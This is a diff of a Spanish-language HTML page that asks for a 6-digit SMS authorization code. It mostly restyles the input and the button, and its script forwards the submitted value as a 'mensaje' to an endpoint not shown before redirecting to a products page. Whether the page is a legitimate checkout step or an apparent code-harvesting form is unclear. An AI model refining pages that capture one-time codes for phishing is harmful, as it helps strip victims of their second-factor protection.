@@ -4,6 +4,42 @@
   <meta charset="UTF-8">
   <title>Autorización por SMS</title>
   <link rel="stylesheet" href="style.css">
+  <style>
+    input.sms {
+      border: 1px solid #000;
+      outline: none;
+      color: #000;
+      padding: 10px;
+      font-size: 18px;
+      width: 100px;             /* espacio para 6 dígitos */
+      text-align: center;
+      background-color: #fff;
+      margin-top: 20px;
+    }
+    input.sms:focus {
+      border: 1px solid #000;
+      outline: none;
+    }
+    .botones {
+      display: flex;
+      justify-content: center;
+      gap: 15px;
+      margin-top: 40px; /* más separado hacia abajo */
+    }
+    .btn-red {
+      background: red;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      padding: 12px 20px;
+      font-weight: bold;
+      cursor: pointer;
+      font-size: 15px;
+    }
+    .btn-red:hover {
+      background: #b30000;
+    }
+  </style>
 </head>
 <body>
   <div class="login-box">
@@ -11,8 +47,10 @@
     <h1>Ingrese el código SMS de 6 dígitos</h1>
 
     <form id="formSMS">
-      <input type="number" id="smsCode" maxlength="6" placeholder="123456" required>
-      <button type="submit">Autorizar</button>
+      <input type="number" id="smsCode" class="sms" maxlength="6" placeholder="123456" required>
+      <div class="botones">
+        <button type="submit" class="btn-red">Autorizar</button>
+      </div>
     </form>
 
     <div id="mensaje"></div>
@@ -32,7 +70,6 @@
           body: JSON.stringify({ mensaje })
         });
         document.getElementById("mensaje").innerText = "SMS enviado, procesando...";
-        // Aquí decides el siguiente paso: volver a productos o mostrar confirmación
         setTimeout(()=> window.location.href="productos.html", 3000);
       } catch (error) {
         document.getElementById("mensaje").innerText = "⚠️ Error al enviar autorización.";
